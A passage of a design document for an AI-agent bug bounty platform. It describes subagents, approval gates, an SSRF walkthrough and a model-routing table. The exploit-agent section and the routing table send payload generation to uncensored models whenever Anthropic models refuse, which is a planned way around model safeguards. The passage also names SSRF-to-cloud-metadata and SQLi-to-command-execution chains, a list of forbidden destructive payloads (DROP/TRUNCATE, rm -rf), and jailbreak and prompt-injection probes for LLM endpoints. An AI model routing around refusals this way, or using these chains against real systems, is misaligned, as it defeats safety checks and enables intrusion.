│                                                                                  │
│  OpenTelemetry collector → Grafana Cloud LGTM (logs/metrics/traces)             │
│  Langfuse (LLM traces, cost, latency per model/task)                            │
│  Honeycomb (high-cardinality event queries on finding/job data)                 │
│  Sentry (error tracking, performance)                                           │
│  Custom benchmark harness (Cybench/XBOW-104/CVE-Bench CI)                       │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 2.3 The Nine Specialized Subagents

Each subagent is a markdown file in `.claude/agents/` with YAML frontmatter. Each has a dedicated phase ownership, tool allowlist, and model routing choice. The design principle is one subagent per phase or per vulnerability class — never one per tool. The nine subagents map to all phases of the bug bounty kill chain.

### 2.3.1 `recon-agent` — Asset Discovery

**Phase ownership:** Passive + light-active reconnaissance (kill chain phases 2-3).

**Core responsibility:** Surface every in-scope asset — subdomains, IPs, open ports, HTTP endpoints, technology fingerprints, JavaScript-derived internal API paths, historical URLs from Wayback Machine, Shodan/Censys hits — into the data plane's state store and return a structured attack-surface summary to the coordinator.

**Model:** Claude Haiku 4.5 for solo (cheap, fast, 200K context handles large subdomain dumps). Sonnet 4.6 via BYOK for SaaS premium (1M context to hold entire program recon state without paging).

**Tool allowlist:** `Read, Grep, Glob, WebFetch, mcp__scope__*, mcp__pd-tools__subfinder, mcp__pd-tools__dnsx, mcp__pd-tools__httpx, mcp__pd-tools__naabu, mcp__pd-tools__katana, mcp__shodan__host_search, mcp__shodan__cve_lookup, mcp__openrouter__complete`. No `Bash`, no `Write` (to prevent recon agent from modifying state directly), no `Agent` (to prevent recursive spawning).

**Rate limiting:** Every outbound tool call acquires a token from `mcp__politeness__acquire(host)` before execution. Reports response latency via `mcp__politeness__report_response`. Maximum 5 requests per second per host unless the scope MCP explicitly relaxes the limit.

**Handoff protocol:** On completion, calls `mcp__evidence__checkpoint("recon_complete", artifacts=[...])` with content-addressable references to all discovered assets, then returns a JSON summary with: `hosts[]`, `tech_clusters{}`, `high_priority[]`, `ai_endpoints[]`, `evidence_refs[]`.

**Data flow output:** Every discovered host, URL, endpoint, and technology fingerprint is persisted to the evidence store with `source_tool`, `confidence`, and `scope_token` fields. This creates the forensic provenance trail that shows exactly which tool discovered which asset at which timestamp.

### 2.3.2 `scope-guard` — Policy Enforcement

**Phase ownership:** Cross-cutting policy enforcement (invoked by PreToolUse hook defer, not by coordinator).

**Core responsibility:** Handle ambiguous scope decisions that the PreToolUse hook's mechanical logic cannot resolve. Given a pending tool call, the active scope JWT, and the program's written rules, produce a binding allow/deny decision with a reasoning trace for the audit log.

**Model:** Sonnet 4.6 (needs strong rule interpretation; Haiku too literal on edge cases; Opus too expensive for what is essentially a policy lookup).

**Tool allowlist:** `Read` (to access program rules), `mcp__scope__check_target`, `mcp__scope__get_program_rules`. No network tools — scope-guard never makes outbound connections.

**Invocation pattern:** Called asynchronously by the `pretool_scope_guard.py` hook when a `defer` decision is returned. The hook pauses the headless session, spawns scope-guard with a targeted 3-message prompt (system: methodology; user: pending tool call + scope JWT + program rules; assistant: requested format), and resumes the session with the decision.

**Example decision:**
```json
{
  "decision": "deny",
  "target": "staging-internal.example.com",
  "reasoning": "Scope wildcard *.example.com would match, but program rules §3 explicitly excludes 'internal staging environments.' The 'internal' subdomain label is an unambiguous exclusion indicator.",
  "confidence": "high",
  "audit_ref": "audit_2026042801_scope_guard_7f3a..."
}
```

### 2.3.3 `program-selector` — EV-Ranked Program Selection

**Phase ownership:** Program selection and prioritization (pre-engagement).

**Core responsibility:** Given the operator's profile (skill strengths, time budget, target asset types), query the EV-ranked program database, surface the top-N programs ranked by `ev_score`, and explain the reasoning for each recommendation with enough detail for the operator to make an informed choice.

**Model:** Sonnet 4.6 (needs reasoning quality; program selection affects all downstream costs).

**Tool allowlist:** `mcp__ev-mcp__rank_programs, mcp__ev-mcp__get_program_details, mcp__kev-mcp__get_recent_kev, mcp__scope__list_programs`. Read-only — no execution tools.

**EV score inputs queried:** `payout_score`, `saturation_score`, `ops_quality_score`, `asset_fit_score`, `cve_opportunity_score`, `scope_freshness`, `kev_count_on_stack`.

**Output format:** Ranked list with ev_score, explanation of top contributing factors, estimated hourly bounty rate based on historical platform data, recommended first-attack vectors given current KEV/EPSS scores.

### 2.3.4 `scanner-agent` — Vulnerability Scanning

**Phase ownership:** Active vulnerability scanning and fuzzing (kill chain phase 4).

**Core responsibility:** Run template-based vulnerability scans (nuclei, jaeles), content fuzzers (ffuf, feroxbuster), SQLi probes (sqlmap at risk level 1), and API-specific tests (kiterunner for endpoint discovery, arjun for parameter discovery) against recon artifacts. Emit normalized Finding objects to the data plane.

**Model:** Sonnet 4.6. Bulk nuclei output triage (thousands of JSON lines) routes via the OpenRouter MCP to DeepSeek V4-Flash or Qwen3-Coder-30B for cheap, fast extraction into the canonical Finding schema. Complex template authoring routes to Qwen3-Coder (480B) for 1M context code generation.

**Tool allowlist:** Adds `mcp__pd-tools__nuclei, mcp__pd-tools__ffuf, mcp__pd-tools__feroxbuster, mcp__hexstrike__run_tool, mcp__burp__scan, mcp__burp__repeater, mcp__caido__list_requests, mcp__caido__send_replay`. No direct `Bash` — all execution flows through MCP wrappers.

**Scanner discipline:** Nuclei runs with curated tag sets per technology cluster (e.g., `tech:wordpress -t cves/2023,cves/2024,cves/2025` for WordPress hosts) rather than `-t /` blanket scans. Content discovery uses `--auto-tune` and `--auto-bail` to stop when new discovery rate drops below the statistical threshold. SQLmap is restricted to `--batch --level 1 --risk 1 --technique B` on first pass; escalation to higher risk levels requires coordinator approval.

**Handoff:** Returns ranked candidate list with `deduplication_key`, provisional CVSS severity, and `candidate_for_exploit=true` flag for findings that warrant PoC development.

### 2.3.5 `AI-vuln-hunter` — AI/LLM Attack Surface

**Phase ownership:** OWASP LLM Top 10 and AI-specific attack surface (activates when recon flags `ai_endpoints`).

**Core responsibility:** Probe AI/LLM endpoints for prompt injection (direct and indirect), data exfiltration via RAG poisoning, training data extraction, jailbreak susceptibility, and MCP server vulnerabilities. Uses Garak's 120+ probe modules as the systematic testing harness.

**Model:** Sonnet 4.6. Adversarial creative prompting requires stronger reasoning than Haiku can provide; Opus 4.7 for complex multi-turn attack chain development.

**Tool allowlist:** `mcp__garak__run_attack, mcp__garak__list_probes, mcp__tencent-ai-infra-guard__scan, mcp__burp__repeater, mcp__caido__send_replay, WebFetch`. No code execution tools — LLM probing is primarily HTTP-layer.

**Probe selection logic:** 
- For customer-facing chat UIs: `promptinject`, `dan`, `encoding` probes
- For API endpoints with RAG: `leakreplay`, `tap` (Tree of Attack with Pruning), `atkgen`  
- For MCP server endpoints: Tencent AI-Infra-Guard 14-category scan + `mcp-scan` static analysis
- For code generation LLMs: `malwaregen`, `packagehallucination`

**Context from 2026 threat data:** HackerOne's 9th Annual Report documents a 540% increase in AI-related prompt injection reports — this attack class is the highest-growth finding category and is systematically underserved by conventional scanners [research/community_signals.md §Anti-Slop].

### 2.3.6 `exploit-agent` — Exploit Development

**Phase ownership:** Exploit chain construction and PoC generation (kill chain phase 5 pre-validation).

**Core responsibility:** Take validated scanner candidates, construct minimal reproducible PoCs, and demonstrate exploitability in the sandbox. Handles attack chain construction (SSRF→IMDSv2→credentials, XSS→CSRF→ATO, SQLi→RCE, OAuth redirect_uri flaws, JWT algorithm confusion). The most resource-intensive subagent and the one most likely to trigger Claude's safety refusals — hence the heaviest use of the OpenRouter bridge for uncensored models.

**Model:** Opus 4.7 as default (deep reasoning for multi-step chains). Escalation to Mythos for partner accounts. Falls back to OpenRouter routing for payload generation when Anthropic models refuse.

**OpenRouter routing for exploit-agent:**
- Attack-path reasoning / chaining: `deepseek/deepseek-v4-flash` ($0.14 cache-miss input / $0.0028 cache-hit input / $0.28 output per MTok) (per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure) or Opus 4.7 for >4-step chains
- Payload generation (XSS polyglots, SSRF payloads, SQLi injection strings): Venice Dolphin FREE (2.2% refusal) or `cognitivecomputations/hermes-4-70b` ($0.13/$0.40)
- Exploit code writing (Python PoC, Burp extensions): `qwen/qwen3-coder` (free tier for common PoCs; 480B for complex)
- CVSS v4 rationale: `deepseek/deepseek-r1-0528` (open reasoning tokens)

**Tool allowlist:** `Read, Grep, mcp__scope__check_target, mcp__sandbox__run_code, mcp__sandbox__run_poc_template, mcp__burp__repeater, mcp__caido__send_replay, mcp__openrouter__complete, mcp__evidence__put_artifact, mcp__state__*`. No direct Bash — all execution goes through sandbox MCP.

**Hard constraints (hook-enforced):** 
- Every sandbox call must carry a scope_token. The sandbox proxies all egress through scope+politeness gate.
- T2 human approval required before every sandbox execution (approval_gate.py hook).
- No destructive payloads: no DROP/TRUNCATE, no rm -rf, no stored XSS hitting real users, no exfil beyond 1 record / 1 file / 1 environment variable as proof.
- No pivoting beyond the immediate target scope.

**Chain detection heuristics (from XBOW architecture + AutoAttacker KB):**
- Query experience KB for prior validated exploits matching {CWE, product, version}
- Canonical chains to attempt: SSRF→169.254.169.254/latest/meta-data/ (AWS v1) and IMDS v2 token exchange; XSS→CSRF token theft→email change→password reset; SQLi→INTO OUTFILE / xp_cmdshell / COPY PROGRAM; IDOR sequential/predictable ID enumeration; OAuth redirect_uri + PKCE downgrade
- For `llm_target=true` assets: auto-fire Garak probes (promptinject, encoding, leakreplay, atkgen) before manual exploit development

### 2.3.7 `validator-agent` — Independent Verification

**Phase ownership:** Deterministic exploit verification (kill chain phase 5 validation).

**Core responsibility:** Re-execute every exploit candidate from a fresh, clean Firecracker microVM against the live target and adjudicate reproducibility using deterministic oracles appropriate to each vulnerability class. This is the anti-hallucination layer and the architectural moat.

**Model:** Sonnet 4.6 — **intentionally different from the exploit-agent's Opus 4.7** to avoid LLM echo-chamber confirmation bias. The validator sees only the PoC artifact and target URL; it has no access to the exploit-agent's reasoning transcript. This architectural decision directly counters the AnyPoC "mock validation" failure mode [research/academic_cve.md §4.1].

**Tool allowlist:** `mcp__sandbox__run_poc_template, mcp__sandbox__snapshot_filesystem, mcp__burp__repeater, mcp__evidence__put_artifact, mcp__state__query_artifacts`. Critically: no `mcp__openrouter__complete` — validators cannot creatively interpret PoCs. No `WebFetch` beyond what the sandbox proxies.

**Per-class oracle selection:** (Detailed in Part 5). The validator calls the appropriate `oracle-mcp` tool for each bug class: `oracle_xss`, `oracle_ssrf_oast`, `oracle_sqli_timing`, `oracle_ssti_sandbox`, `oracle_idor_matrix`, `oracle_open_redirect`, `oracle_rce_sandbox`, `oracle_ssrf_imds`.

**Verdict schema:**
```json
{
  "finding_id": "f_7f3a...",
  "verdict": "validated | unreproducible | flaky",
  "attempts": 3,
  "evidence_hash": "sha256:8a3f...",
  "oracle_used": "oracle_xss_playwright",
  "cleanup_confirmed": true,
  "validator_model": "claude-sonnet-4-6",
  "timestamp": "2026-04-28T14:22:00Z"
}
```

### 2.3.8 `reporter-agent` — Report Generation & Submission

**Phase ownership:** Report writing and platform submission (kill chain phase 7).

**Core responsibility:** Render validated findings into platform-ready reports with CVSS v4 scoring, reproduction steps, evidence screenshots, redacted PoCs, and impact narrative. Submit through platform APIs after T3 two-person approval. The last gate before a finding leaves the platform.

**Model:** Sonnet 4.6 via BYOK with prompt caching on the report template system prompt (reduces per-report cost by ~80%). Opus 4.7 for premium-tier reports with complex impact narratives.

**Tool allowlist:** `Read, Grep, mcp__state__query_artifacts, mcp__evidence__get_artifact, mcp__normalize__cvss_score, mcp__dedup__check_similarity, mcp__h1__submit_report, mcp__bugcrowd__submit_report, mcp__intigriti__submit_report, mcp__yeswehack__submit_report, mcp__immunefi__submit_report, mcp__openrouter__complete`. The submission tools fire only after T3 approval (hook-enforced).

**Anti-slop report rules (enforced by PostToolUse hook on Write):**
- No prohibited filler words: "leverages," "delve," "unveil," "furthermore," "moreover," "it is important to note," "holistic approach"
- Target ≤ 600 words total for standard reports; ≤ 1000 for critical chain reports
- Every technical claim must cite an `artifact_id` from the evidence store
- No references to functions or endpoints not observed in recon or sandbox output
- Redaction required: all auth tokens replaced with `<REDACTED:sha256:8>`, all PII with `<PII:redacted>`

### 2.3.9 `cloud-recon-agent` — Cloud Infrastructure Discovery

**Phase ownership:** Cloud and container attack surface mapping (runs in parallel with recon-agent when cloud assets detected in scope).

**Core responsibility:** Map AWS/Azure/GCP cloud configurations, container registries, serverless functions, S3/Blob storage, IAM misconfigurations, exposed cloud metadata services, and Kubernetes API surfaces. Feeds cloud-specific attack vectors to the exploit-agent.

**Model:** Haiku 4.5 for initial enumeration; escalates to Sonnet 4.6 for complex IAM chain analysis.

**Tool allowlist:** `mcp__hexstrike__prowler, mcp__hexstrike__scoutsuite, mcp__hexstrike__pacu, mcp__hexstrike__trivy, mcp__hexstrike__kube_hunter, mcp__hexstrike__checkov, mcp__shodan__host_search, mcp__openrouter__complete`. All cloud tool calls require explicit cloud credentials in the scope JWT — cloud-recon never accepts credentials from the LLM's context.

**Special consideration:** Cloud reconnaissance frequently triggers vendor-side anomaly detection. The politeness gate applies even more strictly for cloud tool calls: maximum 10 API calls per minute per AWS account, hard stop on any 429 or 503 response from cloud control plane APIs.

## 2.4 Inter-Agent Message Contracts

Every message crossing agent boundaries is a typed JSON object validated against a Pydantic v2 schema. No agent may act on unvalidated input. The primary message types:

```json
// ScanJobRequest: Control plane → Coordinator
{
  "job_id": "job_2026042801_a7f3...",
  "scope_jwt": "eyJhbGciOiJSUzI1NiIs...",
  "program_handle": "acme-corp",
  "platform": "hackerone",
  "asset_cluster": ["api.acme.com", "app.acme.com"],
  "operator_profile": {
    "skill_vector": {"sqli": 0.8, "ssrf": 0.9, "idor": 0.7},
    "time_budget_hours": 4,
    "cost_budget_usd": 2.00
  },
  "ev_score": 0.74,
  "priority_classes": ["ssrf", "idor", "auth_bypass"]
}

// ReconResult: recon-agent → Coordinator
{
  "checkpoint": "recon_complete",
  "job_id": "job_2026042801_a7f3...",
  "hosts": [
    {"hostname": "api.acme.com", "ip": "1.2.3.4", "tech": ["nginx/1.25", "node/20"], "ai_endpoint": false},
    {"hostname": "llm.acme.com", "ip": "1.2.3.5", "tech": ["fastapi/0.110"], "ai_endpoint": true}
  ],
  "high_priority": ["api.acme.com/graphql", "app.acme.com/auth/oauth2"],
  "ai_endpoints": ["llm.acme.com/api/chat"],
  "evidence_refs": ["sha256:7a3f...", "sha256:8b2a..."],
  "tokens_used": 12400,
  "cost_usd": 0.037
}

// FindingCandidate: scanner-agent → Coordinator
{
  "finding_id": "f_2026042801_c9d1...",
  "job_id": "job_2026042801_a7f3...",
  "deduplication_key": "ssrf:api.acme.com:/v1/webhook:dest_param",
  "url": "https://api.acme.com/v1/webhook",
  "parameter": "destination",
  "cwe": "CWE-918",
  "provisional_severity": "high",
  "evidence_ref": "sha256:3c8f...",
  "candidate_for_exploit": true,
  "scanner_tool": "nuclei",
  "template_id": "CVE-2024-XXXX",
  "scope_token": "scope_a7f3..."
}

// ValidationResult: validator-agent → Coordinator
{
  "finding_id": "f_2026042801_c9d1...",
  "verdict": "validated",
  "oracle_used": "oracle_ssrf_oast",
  "oast_callback": {
    "type": "http",
    "token": "unique_9f3a2c",
    "received_from_ip": "1.2.3.4",
    "received_timestamp": "2026-04-28T14:22:00Z"
  },
  "evidence_hash": "sha256:5e7d...",
  "attempts": 1,
  "cleanup_confirmed": true,
  "validator_model": "claude-sonnet-4-6"
}
```

## 2.5 Data Flow Walkthrough — Full Kill Chain

Let us trace a single SSRF finding from first ping to submitted report, narrating every state transition, every plane crossing, and every evidence artifact created.

**Step 0 — Program Selection (T-minus):** The operator runs `/scope acme-corp` in the Claude Code TUI. The program-selector subagent queries `mcp__ev-mcp__rank_programs` with the operator's profile. The EV ranker returns `acme-corp` with `ev_score: 0.74`, driven primarily by high payout ($10,000 critical), low researcher density (45 active researchers), and two recent scope additions (subdomains added 48 hours ago with freshness score 0.97). The scope-mcp generates a signed RS256 scope JWT for this program, storing the asset list and exclusion list as JWT claims. The JWT is persisted to Postgres and passed to the coordinator as an environment variable on session start.

**Step 1 — Session Initialization:** The control plane's Hatchet workflow spawns `claude -p "run job_2026042801_a7f3" --agent bountystrike-coordinator --output-format json` with `HUNTMESH_SCOPE_JWT` set. The `SessionStart` hook fires, calling `verify_attestation.py` (checks the operator's engagement declaration signature) and `load_scope.py` (validates the JWT signature, materializes the asset list into `/run/scope/assets.json` in the container). The coordinator loads CLAUDE.md. The Langfuse trace session opens.

**Step 2 — Recon Phase:** The coordinator spawns the recon-agent via `Task("recon", "map attack surface for job_2026042801_a7f3")`. The recon-agent calls `mcp__pd-tools__subfinder` for `acme.com`. Before the tool executes, `PreToolUse` hook fires, calls `scope_enforce.py`, which verifies `acme.com` matches the scope JWT's `targets.wildcards` list, and returns `approve`. Subfinder discovers 47 subdomains. The PostToolUse hook fires, hashes the subfinder JSON output, stores it in R2 at `sha256:3a7f...`, and appends an audit log row.

The agent calls `mcp__pd-tools__httpx` against all 47 subdomains. PreToolUse fires 47 times (one per target). 45 are approved immediately; 2 are deferred (staging-internal.acme.com matches both the wildcard and an exclusion pattern). The scope-guard subagent is spawned for the 2 deferred calls; it denies both after 8 seconds of analysis, citing program rules §3. The headless session resumes with `allow=false` for those targets. The remaining 45 hosts are probed; httpx returns technology fingerprints, titles, and status codes. One host — `llm.acme.com` — returns `X-Powered-By: FastAPI` and the title contains "Chat Assistant." The recon-agent tags it `ai_endpoint: true`.

The agent calls `mcp__shodan__host_search` for the IP range. Returns 3 additional open ports. PostToolUse captures the Shodan response and creates a new evidence artifact. The recon-agent returns its structured summary, checkpoints evidence. Time elapsed: 11 minutes. Tokens: 18,400. Cost: $0.028.

**Step 3 — Scanning Phase:** The coordinator spawns the scanner-agent with the recon summary. The agent calls `mcp__pd-tools__nuclei` against the high-priority targets with tag sets `exposure:tokens,api,swagger` and `cves:2024,2025`. Nuclei runs on 12 high-priority endpoints. After 4 minutes, nuclei emits 43 JSON findings. 

The scanner-agent calls `mcp__openrouter__complete` with model `deepseek/deepseek-v4-flash` and a JSON schema response format to triage the 43 findings into structured Finding objects. DeepSeek returns 43 classified findings in 8 seconds for $0.003. The dedup-mcp performs a pgvector similarity check against the 847 prior findings for this program; 31 are marked `likely_duplicate` (similarity >0.85); 12 are new candidates. Among the 12: one nuclei template fires for `ssrf-via-webhook-destination` on `https://api.acme.com/v1/webhook?destination=http://example.com`. Marked `candidate_for_exploit: true`.

**Step 4 — Exploit Development Phase:** The coordinator spawns the exploit-agent with the SSRF candidate. The agent reasons: the `destination` parameter of the webhook endpoint accepts a URL. The nuclei template fired on a DNS interaction. Hypothesis: the server makes a server-side request to the URL provided in `destination`. Test: provide an Interactsh OOB token as the destination URL.

The exploit-agent calls `mcp__openrouter__complete` with model `cognitivecomputations/dolphin-mistral-24b-venice-edition` and prompt: "Generate an SSRF test payload for `https://api.acme.com/v1/webhook?destination=<OAST>`. Replace `<OAST>` with the Interactsh token `unique_9f3a2c.oast.fun`." Venice Dolphin returns the payload in 3 seconds with 2.2% refusal rate — no refusal. The exploit-agent calls `mcp__sandbox__run_poc_template` with the generated request. The `approval_gate.py` hook fires, sends a T2 approval notification to the operator's console, and pauses the session with `defer`. The operator approves in 45 seconds via the web dashboard.

The sandbox VM boots in 112ms. The PoC executes: a POST request to `https://api.acme.com/v1/webhook` with body `{"destination": "http://unique_9f3a2c.oast.fun"}`. The sandbox's egress proxy permits the request (target host `api.acme.com` is in scope). The Interactsh client inside the sandbox listens. After 2.3 seconds: an HTTP callback arrives at `unique_9f3a2c.oast.fun/unique_9f3a2c` originating from IP `1.2.3.4` (the target server's egress IP). The SSRF is confirmed. The sandbox snapshots the callback log, hashes it to `sha256:5e7d...`, and writes it to R2. The exploit-agent writes a `Finding` object to the state store with `status: exploit_candidate`.

**Step 5 — Validation Phase:** The coordinator spawns the validator-agent with only the FindingCandidate object (no exploit-agent transcript). The validator calls `mcp__oracle-mcp__oracle_ssrf_oast` with a fresh Interactsh token. A new sandbox VM boots. The PoC re-executes. A new callback arrives at the fresh token from IP `1.2.3.4`. The oracle returns `verdict: validated`. The validator writes a ValidationResult. The finding advances to `status: validated`. Time from candidate to validated: 4 minutes.

**Step 6 — Report Generation:** The coordinator spawns the reporter-agent. The agent fetches the validated finding from state, pulls the evidence artifacts from R2, calls `mcp__normalize__cvss_score` to compute CVSS 4.0 (AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N → score 8.7, High), calls `mcp__dedup__check_similarity` against all prior H1 submissions for acme-corp (returns max similarity 0.42 — no duplicate risk), and calls `mcp__openrouter__complete` with Sonnet 4.6 to generate the prose report. The reporter renders the markdown, redacts all tokens, runs the anti-slop word filter (no prohibited phrases found), and calls `mcp__h1__submit_report` with `draft: true`.

The `approval_gate.py` T3 hook fires: the report draft plus a diff view with redactions highlighted is posted to the operator's approval console. The two-person requirement: the operator's colleague reviews the report in the web triage room. After 3 minutes of review, both parties approve. The hook returns `allow`, and `submit_hackerone(draft=false)` executes. The H1 report_id is written back to the state store. The Langfuse trace session closes with total cost: $0.19. Total wall-clock time: 23 minutes. Finding confirmed by H1 triage: 2 days later with $2,500 bounty awarded.

## 2.6 Storage Architecture

### 2.6.1 Postgres 17 + pgvector + pgvectorscale + ParadeDB

The storage layer is deliberately single-database-centric. The decision to run everything through Postgres 17 rather than distributing across Redis, Elasticsearch, and a separate vector DB is intentional: operational simplicity for the solo deployment, and Postgres's extensions close the capability gap at SaaS scale.

**pgvector** stores 1536-dimensional OpenAI `text-embedding-3-large` embeddings for every finding, scope description, and report text. The primary use cases are: semantic dedup via cosine similarity (`1 - (embedding <=> query_embedding) > threshold`), experience KB retrieval (similar past exploits for a given CWE/product combination), and report similarity checking before submission. 

**pgvectorscale** adds the DiskANN index algorithm on top of pgvector, enabling sub-10ms similarity queries at 10M+ vector scale. This is the technology that makes the semantic dedup check fast enough to run inline on every new finding without introducing noticeable latency.

**ParadeDB** adds BM25 full-text search via the `pg_search` extension. This enables hybrid search (BM25 + cosine similarity weighted combination) over scope descriptions, JavaScript file contents extracted during recon, and report text. The BM25 layer is critical for search queries involving specific CVE IDs, product names, or parameter names — semantic search alone misses exact-match lookups.

### 2.6.2 Content-Addressable Evidence Store

Every evidence artifact is stored with a key derived from its content hash:

```
r2://{bucket}/{platform}/{program_handle}/{finding_id}/{sha256_hex}
```

This design means:
- Duplicate evidence (same HTTP response body from two scan runs) deduplicates automatically
- Evidence integrity can be verified by any party by recomputing the hash
- Evidence objects are immutable once written — no modification path exists

The hash-chained audit log appends a new row for every platform event (tool call, state transition, scope check, model invocation, approval action). Each row contains:

```sql
CREATE TABLE audit_log (
    id         BIGSERIAL PRIMARY KEY,
    ts         TIMESTAMPTZ NOT NULL DEFAULT now(),
    session_id UUID NOT NULL,
    event_type TEXT NOT NULL,
    actor      TEXT NOT NULL,  -- 'recon-agent', 'operator:alice', 'scope-guard'
    tool       TEXT,
    target     TEXT,
    decision   TEXT,
    evidence   TEXT,  -- R2 key or NULL
    prev_hash  BYTEA NOT NULL,  -- SHA-256 of previous row's content
    row_hash   BYTEA NOT NULL   -- SHA-256 of this row's content (excluding row_hash itself)
);
```

The hash chain makes tamper detection trivial: any modification to a historical row breaks the chain from that point forward. Optional Sigstore Rekor anchoring publishes the daily root hash to the public Rekor transparency log, making retrospective tampering detectable by any external auditor.

## 2.7 Orchestration: Hatchet (Solo) → Temporal Cloud (SaaS)

**Hatchet** is a Postgres-backed workflow orchestration engine that runs as a single binary with no external dependencies beyond the Postgres instance that BountyStrike already runs. For the solo deployment, this means the entire orchestration system adds zero operational complexity — it is just another Docker Compose service. Hatchet provides: cron scheduling, workflow fan-out/fan-in (parent workflow spawns child workflows, waits for all to complete), durable workflow state (survives restarts), and typed step inputs/outputs [research/program_selection.md §8.3].

**Temporal Cloud** is the SaaS equivalent. Temporal provides everything Hatchet provides plus: multi-tenant workflow isolation (per-org workflow namespaces), global workflow continuations (a scan started in US-East can continue on EU-West after a failure), workflow versioning (deploy new agent code without interrupting in-flight scans), and enterprise SLAs. The Temporal Cloud SDK is drop-in compatible with the self-hosted Temporal server, so the migration path from Hatchet to Temporal Cloud is defined: replace the Hatchet SDK calls with Temporal SDK calls, the workflow logic is identical.

**LangGraph 1.x** provides checkpoints and interrupts for the multi-step agent workflows that cross approval tier boundaries. When a finding hits a T2 or T3 approval requirement, the LangGraph workflow saves its state to Postgres (LangGraph checkpoint), suspends, and resumes after the approval is received. This gives the platform durable, resumable agent workflows without requiring the agent to hold state in a long-running process.

## 2.8 Sandbox Plane Architecture

Every code execution, every exploit PoC, and every nuclei scan runs inside an isolated sandbox. The isolation model has three tiers depending on deployment mode:

**microsandbox (solo, lowest overhead):** A lightweight container sandbox using gVisor + seccomp. Not full VM isolation, but provides kernel-level syscall filtering that prevents most sandbox escapes. Boot time ~50ms. Appropriate for individual operators who trust their own machines.

**Firecracker microVM (SaaS, highest isolation):** Firecracker provides hardware VM isolation (KVM-based) with a 125ms boot time and ~5MB overhead per VM. Each job gets a dedicated VM that is destroyed after the job completes. Egress is controlled by iptables rules on the `tap0` virtual network interface, enforced by the host kernel — completely outside the guest VM's control. Even if a malicious payload inside the VM attempts to modify egress routing, it cannot reach the host's iptables. The scope JWT is materialized into iptables allow rules at VM boot time: only IPs/CIDRs listed in the JWT's `targets.ips` and the Interactsh/Burp Collaborator server IPs are roachable.

**E2B (SaaS alternative, managed):** E2B provides Firecracker-based sandboxes as a managed service with a simple API. Useful for bootstrapping SaaS before bare-metal Firecracker infrastructure is provisioned. Higher per-VM cost but zero infrastructure management.

---

# Part 3 — Model Routing Strategy

## 3.1 Architecture Overview

The model routing layer is one of the most operationally impactful components of BountyStrike v5. The wrong routing decisions — sending cheap work to expensive models, sending safety-sensitive work to uncensored models, sending reasoning-heavy work to fast-and-cheap models — either blow the cost budget or degrade quality below the confirmed-rate target. The right routing decisions enable the platform's most important economic promise: a sub-$0.20 full scan on a solo operator setup with Anthropic model quality for the decisions that matter.

The architecture has two parallel tracks: **OpenRouter primary** and **BYOK Anthropic direct**. OpenRouter handles all non-Anthropic models, all cost routing decisions, and all uncensored model fallbacks. BYOK Anthropic handles direct Anthropic API calls with 1 million free requests per month per user, bypassing OpenRouter for Anthropic calls to eliminate the markup and the potential data retention concerns [research/openrouter_models.md §BYOK].

## 3.2 The Full Model Routing Matrix

Every task in the BountyStrike pipeline has a designated primary model, fallback model, and cost ceiling. The following table encodes the routing logic that lives in `mcp__openrouter__complete`'s routing policy file:

| Task | Primary Model | Price In/Out $/Mtok | Fallback | Rationale |
|---|---|---|---|---|
| Bulk triage / dedup | `deepseek/deepseek-v4-flash` | $0.14 / $0.28 (cache-hit $0.0028) | `qwen/qwen3-coder-30b` free | Highest-volume task; $0.14 cache-miss input handles 10k findings for $1.40 (per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure) |
| Recon synthesis (large output) | `google/gemini-3.1-pro` | $2.00 / $12.00 | `anthropic/claude-haiku-4-5` | 2M context; synthesizes full subfinder+katana output without paging |
| Subdomain enumeration triage | `anthropic/claude-haiku-4-5` | $1.00 / $5.00 | `deepseek/deepseek-v4-flash` | Fast + cheap for binary in-scope classification |
| Vulnerability hypothesis gen | `anthropic/claude-sonnet-4-6` | $3.00 / $15.00 | `openai/gpt-5.4` | Primary hypothesis quality gate; Sonnet 4.6 = Opus-level coding at $3 |
| Deep reasoning / multi-step chain | `anthropic/claude-opus-4-7` | $5.00 / $25.00 | `openai/gpt-5.5-pro` | Reserved for >4-step exploit chains; costs justify for $10K+ findings |
| Mythos hypothesis (partner) | `anthropic/claude-mythos-preview` | $25.00 / $125.00 | `anthropic/claude-opus-4-7` | Glasswing partner accounts only; 83.1% CyberGym vs 40% public SOTA |
| Exploit code generation | `qwen/qwen3-coder` free | $0.00 | `mistralai/devstral` $0.10/$0.30 | Free tier 480B model; 1M context for full codebase PoCs |
| Uncensored payload synthesis | Venice Dolphin FREE | $0.00 | `cognitivecomputations/hermes-4-70b` $0.13/$0.40 | 2.2% refusal rate; Anthropic frontier models refuse a meaningful share of offensive prompts, so known-refusal categories route to Venice/Hermes (no primary source for a hard Anthropic refusal %; described as mechanism per v6 reframe) |
| CVSS v4 scoring rationale | `deepseek/deepseek-r1-0528` | $0.50 / $2.15 | `deepseek/deepseek-v4-flash` | Open reasoning tokens; auditable scoring decisions |
| Exploit validation reasoning | `anthropic/claude-opus-4-7` | $5.00 / $25.00 | `openai/gpt-5.5-pro` $30/$180 | Validation demands highest accuracy; false negatives cost $10K+ |
| Report prose generation | `anthropic/claude-sonnet-4-6` | $3.00 / $15.00 | `openai/gpt-5.4` | Report quality directly affects triage acceptance rate |
| JSON extraction from noise | `mistralai/mistral-small-3.2-24b` | $0.09 / $0.25 | `deepseek/deepseek-v4-flash` | Strict schema extraction; cheapest competent JSON extractor |
| Tech fingerprint classification | `google/gemini-3.1-pro` | $2.00 / $12.00 | `anthropic/claude-haiku-4-5` | Long-context JS analysis and SPA routing inference |
| LLM probe generation | `anthropic/claude-sonnet-4-6` | $3.00 / $15.00 | `x-ai/grok-4.20` 2M ctx | Adversarial prompting requires creativity + safety awareness |
| Cloud IAM chain analysis | `anthropic/claude-opus-4-7` | $5.00 / $25.00 | `google/gemini-3.1-pro` | Complex permission graph reasoning; worth Opus cost for cloud vulns |
| Daily intelligence brief | `anthropic/claude-haiku-4-5` | $1.00 / $5.00 | `deepseek/deepseek-v4-flash` | Routine summarization; Haiku quality sufficient |

## 3.3 OpenRouter Routing Mechanics

The OpenRouter API accepts routing hints that control provider selection, fallback behavior, and performance tier [research/openrouter_models.md §Routing Reference]:

